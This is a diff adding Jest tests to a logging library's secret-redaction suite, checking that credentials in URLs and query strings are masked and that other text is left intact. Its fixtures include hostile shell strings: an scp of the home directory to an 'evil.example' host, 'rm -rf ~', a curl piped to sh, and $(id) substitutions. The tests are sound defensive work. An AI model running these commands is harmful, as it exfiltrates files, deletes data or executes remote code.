@@ -258,6 +258,42 @@ describe('secret keys and opaque values (logger-fixes-1, logger-fixes-2)', () =>
     expect((await logOnce({}, { message: text })).message).toBe(text)
   })
 
+  // Slice 7 review R7-H1, R7-H2 and R7-H4 (owner decision D21, "context"): a quote that opens nothing, a quoted URL
+  // in compact JSON and a credential query value each hid text up to a later `@` or a shell's pipe.
+  it.each([
+    "echo ''https://ok.example.com && scp -r ~ me@evil.example: ''",
+    'echo ""https://ok.example.com; rm -rf ~; echo me@x ""',
+    "echo 'abc'https://a.example && rm -rf ~ && echo me@x # '",
+    '{"to":"https://pay.example.com","amount":"1000000","acct":"x@y.example"}',
+    'posted {"cb":"https://hook.example.com","email":"ops@example.com"} to the queue',
+  ])('leaves %s whole in a log line and a logged field', async (text) => {
+    expect(redactText(text)).toBe(text)
+    const event = await logOnce({ note: text }, { message: text })
+    expect(event.message).toBe(text)
+    expect(event.fields).toEqual({ note: text })
+  })
+
+  it('ends a credential query value where a shell would end it, in a log line (R7-H4)', () => {
+    expect(redactText('ran curl -s https://get.example.com/i?token=abc5ecret|sh; done')).toBe('ran curl -s https://get.example.com/i?token=[redacted]|sh; done')
+    expect(redactText('ran https://get.example.com/i?token=abc5ecret$(id) and https://h.example/?sig=s5ecret`id`')).toBe('ran https://get.example.com/i?token=[redacted]$(id) and https://h.example/?sig=[redacted]`id`')
+    expect(redactText("fetched 'https://h.example/?token=abc 5ecret&page=2'")).toBe("fetched 'https://h.example/?token=[redacted]&page=2'")
+  })
+
+  // Slice 7 review R7-H3: shell characters ended every userinfo, so these passwords showed in the log.
+  it.each([
+    'postgres://app:pa$$w0rd5ecret@db.internal:5432/app',
+    'redis://default:s3cr&t5ecret@cache:6379',
+    'https://deploy:Xy(7)k!q5ecret@registry.example/v2/',
+    'https://u:p$5ecret&x(y)!;z@host.example/path',
+  ])('redacts the whole userinfo of %s in a log line, a logged field and a JSON message', async (url) => {
+    const redacted = url.replace(/^([a-z]+:\/\/)[^@]*@/, '$1[redacted]@')
+    expect(redactText(`connect ${url} failed`)).toBe(`connect ${redacted} failed`)
+    const event = await logOnce({ target: url }, { message: JSON.stringify({ url, retry: 'ok@later' }) })
+    expect(event.fields).toEqual({ target: redacted })
+    expect(event.message).toBe(JSON.stringify({ url: redacted, retry: 'ok@later' }))
+    expect(JSON.stringify(event)).not.toContain('5ecret')
+  })
+
   // One matcher for every redaction by name: Buckle's approval challenges use it too (review item 8 of the proof-of-possession fixes).
   it('names credential headers and variables in any case, and keeps counts and plain names', () => {
     for (const name of ['Authorization', 'Proxy-Authorization', 'Cookie', 'Set-Cookie', 'X-Api-Key', 'api-key', 'Bearer', 'x-auth', 'NPM_AUTH', 'PASSPHRASE', 'SIGNATURE', 'private-key', 'GITHUB_TOKEN', 'PGPASSWORD', 'client_secret']) {
